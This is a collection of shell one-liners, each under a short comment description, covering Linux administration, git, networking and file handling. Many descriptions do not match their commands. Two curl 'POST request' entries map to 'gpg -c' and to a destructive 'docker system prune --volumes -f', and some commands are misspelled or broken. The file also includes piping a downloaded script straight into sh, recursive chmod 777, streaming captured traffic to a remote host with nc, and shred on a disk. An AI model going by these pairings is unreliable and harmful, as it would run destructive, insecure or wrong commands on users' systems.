printf "g/^/m0\nw\nq"|ed $FILE
# Put at the end of the rsa public key an comment(default value is the hostname)
ssh-keygen -C hello@world
# mount remote directory
sshfs user@host:/path/to/remote/dir local-mount-point
# Left-Handed mouse
xinput set-button-map #inputnumber 3 2 1
# List all packages with no dependencies (yum based system)
package-cleanup --leaves --all
# grep or
egrep 'string1|string2' file
# reload config
source .bashrc
# Make a HTTP request using curl with POST method
gpg -c file.txt
# Show all listening and established ports TCP and UDP together with the PID of the associated process
lsof -ni
# Get all git commits of a specific author in a nice format
git log --name-status --author="[The Author's Name]"
# run a command repeatedly indefinately
while true ; do killall mc ; done
# Rerun a command until there are no changes, but no more than N times.
ps r -A
# changing permissions to many folders, sub folders and files in the current directory.
for i in * ; do chmod -R 777 $i;done
# Show hidden files
defaults write com.apple.finder AppleShowAllFiles TRUE
# View inodes
sudo find . -xdev -type f | cut -d "/" -f 2 | sort | uniq -c | sort -n
# httpd don't work on SELinux? do this command.
sudo chcon -R -reference /var/www /var/vhost_docroot_path
# ssh-keygen -b 4048 -t rsa -C "comment"
ssh-keygen -b 4048 -t rsa -C "comment"
# get full git commit history of single file
git log -p --name-only --follow <file>
# make directory
mkdir /tmp/dir1/{0..20}
# Make "pcap" file
tcpdump -i eth0 -s 65535 -w test_capture
# List LVM Volume Groups as an unprivileged user
cat /sys/block/{*,*/*}/holders/dm*/dm/name | awk -F- '{print $1}' | sort -u
# Resume a download
wget -c [URL]
# Current sub-folders sizes
du -sh *
# Converts ext2 to ext3
unset MANPATH; manpath >/dev/null
# Use a variable in a find command.  Useful in scripting.
find "$1" -iname "*$2*"
# Find LVM Volume Group name for a block device
cat /sys/block/md1/holders/dm*/dm/name | awk -F- '{print $1}' | sort -u
# Bingo-like raffle
yes 'echo $(( RANDOM%100+1 )); sleep 5' | bash
# Berechtigungen nach einer Referenz ?ndern
sudo chmod --reference=Referenz.foo Datei.foo
# Display EPOCH time in human readable format using AWK.
date -d @1268727836
# get newest file in current directory
find . -maxdepth 1 -printf '%A@\t%p\n' | sort -r | cut -f 2,2 | head -1
# Find the mounted storages
sudo find . -name "syslog*.gz" -type f | xargs gzip -cd | grep "Mounted"
# extraer la MAC del comando ifconfig
ifconfig eth0 | grep HW | cut -d " " -f 11
# opens folder and displays
ct() {cd $1; tree -L 2}
# iptables for mac
-A INPUT -p tcp --dport 22 -m mac --mac-source 3E:D7:88:A6:66:8E -j ACCEPT
# cd out n directories (To move n level out of current directory)
cdb() { for i in $(seq $1); do cd ..; done }
# Grep live log tailing, tracks file open/close
tail -F some_log_file.log | grep the_thing_i_want
# recursively change file name extensions
find . -type f -name \*.c | while read f; do mv $f "`basename $f .c`".C; done
# Compare a file with the output of a command or compare the output of two commands
vimdiff foo.c <(bzr cat -r revno:-2 foo.c)
# File without comments or blank lines.
gawk '!/^[\t\ ]*#/{print $0}' filename | strings
# Open a different file for edition on a vertical split screen inside your vim session
:vsplit filename
# Schedule one job after another (running).
while ps -p $PID; do sleep 1; done; script2
# finf ./ -name logs -type f -size 50
finfd./ -name logs -type f -size 50
# Find only folders in a directory
find . -type d
# Shell pocket calculator (pure sh)
calc(){ printf "%.8g\n" $(printf "%s\n" "$*" | bc -l); }
# Kill a process by its partial name
killall -r 'a regular expression'
# make directory
$ mkdir -p /tmp/dir1/{0..20}
# Graphical tree of sub-directories
find . -type d |sed 's:[^-][^/]*/:--:g; s:^-: |:'
# make a central proxy access from where it's high speed link available.
for i in `find -name '*_test.rb'` ; do mv $i ${i%%_test.rb}_spec.rb ; done
# show 20 last modified files in current directory including subdirectories
find . -type f -printf "%T@ %Tc %p\n" |sort -n |cut -d' ' -f2- |tail -n20
# View all file descriptors owned by a process
sudo lsof -p `sudo ps aux | grep -i neo4j | grep -v grep | awk '{ print $2 }'`
# edit multiple files at once
:bufdo :%s/<what-was>/replace-to/g | w!
# Read curl output line by line in a while loop
while read line; do echo $line;done < <(curl -s <URL of file to read>)
# alias dir to ls -al
alias dir="ls -al"
# Count files by extension
find . -type f | sed -n 's/..*\.//p' | sort -f | uniq -ic
# bzip2 all files in a directory older than 1 week (nicely)
find /logdir -type f -mtime +7 -print0 | xargs -0 -n 1 nice -n 20 bzip2 -9
# Get HTTP headers using curl, but still perform a GET
curl -sSi <URL> | sed '/^\r$/q'
# Show apps that use internet connection at the moment.
sudo lsof -P -i -n | awk '{print $1,$5,$8}' | tail -n +2 | uniq -c | sort -nr
# Using arp command to block hosts.
Blocking ip: arp -s ip_of_host 0, Unblocking ip: arp -d ip_blocked
# Clean up old xauth entries
xauth list | cut -f1 -d\  | xargs -i xauth remove {}
# Remotely sniff traffic and pass to snort
sniff_host:  tcpdump -nn -i eth1 -w - | nc 192.168.0.2 666
# Clear IPC Message Queue
ipcs -a | grep 0x | awk '{printf( "-Q %s ", $1 )}' | xargs ipcrm
# Place the argument of the most recent command on the shell
!$
# Generate Random Text based on Length
genRandomText() { cat /dev/urandom|tr -dc 'a-zA-Z'|head -c $1 }
# List all images in icon/cursor files
icotool -l demo.ico
# add a change in git that you have just checked using git diff
^diff^add
# SSH Auto-login with password
SSHPASS='your_password' sshpass -e ssh me@myhost.com
# Opens up a background session within an existing fron-end session
screen
# Flush memcache cache
echo 'flush_all' | nc localhost 11211
# Recursively remove all files in a CVS directory
sed 's/^[[:blank:]]*//; s/^#.*//; /^$/d' filename
# Writing the output of a command to end of a file
COMMAND - OPTIONS - MORE OPTIONS | tee >> /file/you/want_to_append_output_to
# List size of individual folder in current directory
du -hs *
# Verify sha1sum of a file
sha1sum -c file.sha1
# Add some text and the current date and time to a file
echo "some text `date  +%Y-%m-%d\_%H:%M:%S`" >> /path/to/filename
# change mac address
ifconfig eth0 hw ether 00:11:22:33:44:55
# lists contents of a tar file
tar -tf /path/to/file.tar
# see what traffic is mostly hitting you
tcpdump -i eth0 -n  | head
# List empty directories only in present level
find ./ -maxdepth 1 -empty -type d -print
# Show sizes and calculate sum of all files found by find
find -name *.bak -print0 | du -hc --files0-from=-
# create a number of files at once in one command
touch file1{1..34}
# md5sum
md5sum filename
# Test your total disk IO capacity, regardless of caching, to find out how fast the TRUE speed of your disks are
time dd if=/dev/zero of=blah.out oflag=direct bs=256M count=1
# download and run script from trusted webserver
wget -qO - sometrusted.web.site/tmp/somecommand | sh
# move contents of the current directory to the parent directory, then remove current directory.
mv -n * ../; cd ..; rmdir $OLDPWD
# connects to db2 database instance/alias "stgndv2" user "pmserver" using password "xxxxxxx"
db2 CONNECT TO stgndv2 USER pmserver USING ********
# Less verbose CVS status (skips unmodified up-to-date files)
find . | grep -E "(\||\\|\?|\*|<|\"|:|>|\+|\[|\])"
# List users in a group
lid -g <group>
# List recursively only empty folders on present dir
find ./ -empty -type d -print
# total number of files inside current directory
ls -R | wc -l
# Simplest web server ever!
nc -k -l 5432 -c 'echo My Web Server is Alive'
# Grant read-only permissions to user or group
icacls directory_or_file /grant user_or_group:(OI)(CI)rx /t / l /q
# find directories on your machine that are taking up greater than 1G
du -h -d 1 | ack '\d+\.?\d+G' | sort -hr
# Interactive rebase
git rebase -i SHA
# Easily move around many directories
a() { alias $1=cd\ $PWD; }
# Lazy man's vim
function v { if [ -z $1 ]; then vim; else vim *$1*; fi }
# let a cow tell you your fortune
fortune | cowsay -f tux
# Find all NTFS-invalid filenames in "."
find . | grep -E "(\||\\|\?|\*|<|\"|:|>)"
# Check if TCP port 25 is open
netstat -tln | grep :25
# copy multiple files using SCP
scp username@computer:"path/To/File1 path/To/File2" destination/
# To check system send and receive tcp queue current size
ss -ntpl
# Remove tag git
git tag -d tagname
# Comment out all lines in a file beginning with string
sed -i '/^somestring/ s/^/#/' somefile.cfg
# A better 'apt-cache' using Xapian to rank results
ps axo pid,ppid | awk "{ if ( \$2 == $PID ) { print \$1 }}")
# Prompt the user for input of y or n, wait for input then continue.
read -p "Question that you want an answer to?" yn
# Find the 10 users that take up the most disk space
du -sm /home/* | sort -n | tail -10
# replace dots in filenames with dashes
sudo lsof -iTCP:25 -sTCP:LISTEN
# list all files or directories consuming 1Mb or more
du -sc .[!.]* * |grep '^[0-9]{4}'
# Print all open regular files sorted by the number of file handles open to each.
lsof -a -d 1-99 -Fn / | grep ^n | cut -b2- | sort | uniq -c | sort -n
# Total space used by open but deleted files
sudo lsof -nP | awk '/deleted/ { sum+=$8 } END { print sum }'
# Display "ls -l" output with color in less
ls -l --color | less -R
# Remove all intermediate docker images after build
docker images | grep <none> | awk '{ print $3; }' | xargs docker rmi
# Delete all files in a folder that don't match a certain file extension
find . -type f ! -name "*.foo" -name "*.bar" -delete
# Find out which process uses an old lib and needs a restart after a system update
sudo lsof | grep 'DEL.*lib' | cut -f 1 -d ' ' | sort -u
# Display the top ten running processes - sorted by memory usage
ps axo %mem,pid,euser,cmd | sort -nr | head -n 10
# grep 2 words existing on the same line
grep -E/egrep 'word1.*word2|word2.*word1' "$@"
# Convert input to a line of quote protected CSV
cat file | paste -s -d'%' - | sed 's/\(^\|$\)/"/g;s/%/","/g'
# allows you to view your .bash_history file
$ vi .bash_history
# git discard unstaged changes
git stash save --keep-index
# MTR command line to show jitter and mimic network traffic
sudo mtr -s 1472 -B 0 -oLDRSWNBAWVJMXI <ip address>
# Find all processes running under your username.
ps -ef | grep $USER
# How to know if your NIC receive link
watch ethtool eth0
# Sort all files and directories by size, rounded to the nearest megabyte. (Substitute custom path for *.)
du -ms * | sort -nr
# get LAN ip
ifconfig | grep inet
# Print data from field 9 till the end separated by a white space and new record separated by newline.
awk '{for (i=9;i<=NF;i++) {printf "%s",$i; printf "%s", " ";}; printf "\n"}'
# Smart remove - Removes files and directories smarter. Put it in your ~/.bash_profile/~/.bash_*
srm() { if [[ -d $1 ]]; then rm -R $1; else rm $1; fi }
# sddsgdgdssreer
sh all ip/net
# Using curl to fire a post request with data
docker system prune --volumes -f
# edit list of files in last command
vi `!!`
# Add the sbin directories to your PATH if it doesn't already exist in ZSH.
path+=( /sbin /usr/sbin /usr/local/sbin ); path=( ${(u)path} );
# Create a shell script from history of commands
history | awk '{$1=""; print $0}' > install_pkg.sh
# List tasks running
tasklist
# immediatly attach to previous tmux session when connecting through ssh
ssh -t user@remote_host tmux attach
# diff files ignoring comments and blank lines (lines starting with #)
diff -u <(grep -vE '^(#|$)' file1) <(grep -vE '^(#|$)' file2)
# Clone perms and owner group from one file to another
tar -cpf - ./sourceFile | tar -xpf - -C ./targetDir/
# Return ZSH colors
echo ${(o)color}
# having root on server, add user's public key to his keys (no password required)
ssh-copy-id -i user_public_key.pub root@host
# Grep live log tailing
tail -F some_log_file.log | grep --line-buffered the_thing_i_want
# Remove all intermediate docker images after build
docker image rm $(docker image list -f "dangling=true" -qa)
# use !$ to retrieve filename used with last command
vim !$
# Watching directories
watch -n1 "ls -p | grep '/$'"
# make image semi-transparent
convert input.png -alpha set -channel A -fx 0.5 output.png
# Quickly get your ipv6 address
curl -6 --silent whatismyipv6.com | sed -n 's/.*<title>//;s/<\/title.*//p'
# Extract multiple file in a directory
for i in *.tar.gz; do tar -xzf $i; done
# put environment variable in history to edit
print -s "PATH='$PATH'"
# Copy a file over SSH without SCP
cat LOCALFILE | ssh HOST "cat > REMOTEFILE"
# Notify by text-message when command completes
sleep 15 ; `echo "done" | mail -s "done" 4158575309@txt.att.net`
# starts a detached screen with name
screen -S [name] -d -m [<command>]
# List wireless clients connected to an access point
arp -i <interface>
# Remove duplicate line in a text file.
sort in-file.txt | uniq -u > out-file.txt
# wait processes
while pgrep nginx;do ;sleep 1;done
# Quick aliases for going up a directory tree
alias ::='cd ../../'
# Find the process you are looking for minus the grepped one
pgrep -fl myprog
# Shows size of dirs and files, hidden or not, sorted.
ls -a | du --max-depth=1 -h 2>/dev/null |sort -h
# Exit mc with 2 keystrokes
<F10><return>
# gets the bare ip(s) of a domain
dig commandlinefu.com | sed -nr 's/^[^;].*?\s([.0-9]{7,15})$/\1/ p'
# Salvage a borked terminal
echo -e \\033c
# Remove the last string  character using rev and cut
echo "command lines" | rev | cut -c 2- | rev
# Completly blank a disk
shred --iterations=N /dev/sdaX
# Register all DLLs in a given folder
for %1 in (*.dll) do regsvr32 /s  %1
# Check to see if a command exists
command -v <command>
# Synchronize date and time with a server
sudo ntpdate serverip
# Replace strings in files
sed -i -e 's/war/peace/g' *
# get eth0 ip address
ip -f inet addr |grep "global eth0$"|awk '{print $2}'|cut -d '/' -f 1
# Command results as an image capture
netstat -rn | convert label:@- netstat.png
# Returns last day of current month
cal | egrep -e '^ [0-9]|^[0-9]' | tr '\n' ' ' | awk '{print $NF}'
# git -  create a local branch that tracks with the remote branch
git checkout -tb mybranch origin/mybranch
# see the partition
partx -l /dev/sdX
# Syslog System Reporting in a shell
tail -f --retry /var/log/syslog /var/log/auth.log | ccze -A
# Watch those evil Red Hat states code D Uninterruptible sleep (usually IO).
watch -n 1 "ps aux | sed -n 's/ D /&/p'"
# List Big Files/Directories
du -h |grep -P "^\S*G"
# Find out actual full path of <file>
readlink -f <file>
# pick up 3 lines start at every 5th line of file.txt
sed -n '1~5{N;N;p}' file.txt
# grep for 2 words existing on the same line
egrep 'word1.*word2' --color   /path/file.log |more
# List open TCP/UDP ports
netstat -anp --tcp --udp | grep LISTEN
# Analyze Apache Web Log Statistics starting on DATE x
sed -n '/05\/Dec\/2010/,$ p' access.log | goaccess -s -b
# Manually rotate logs
or i in `seq 1 12| tac` ; do mv access_log.{$i,$((i+1))}.gz ; done
# Directory management
alias md='mkdir -p'; alias rd='rmdir'; mcd () { mkdir "$@" && cd "$_"; }
# list files other than, those, where you know, part of the name (e.g. file extension)
ls -l !(*.part)
# Share the current tree over the web
python -c "import SimpleHTTPServer;SimpleHTTPServer.test()"
# List open TCP/UDP ports
netstat -ltun
# Convert first letter of string to uppercase
string="${string^}"
# Timer with sound alarm
sleep 15m; yes > /dev/dsp
# Diff with Sections/Headers
diff -U 9999 file_a file_b | tail -n +3 | grep -P "^(\ Header|\-|\+)"
# print twice each lines
echo '1\n2\n2\n3' | sed 'p'
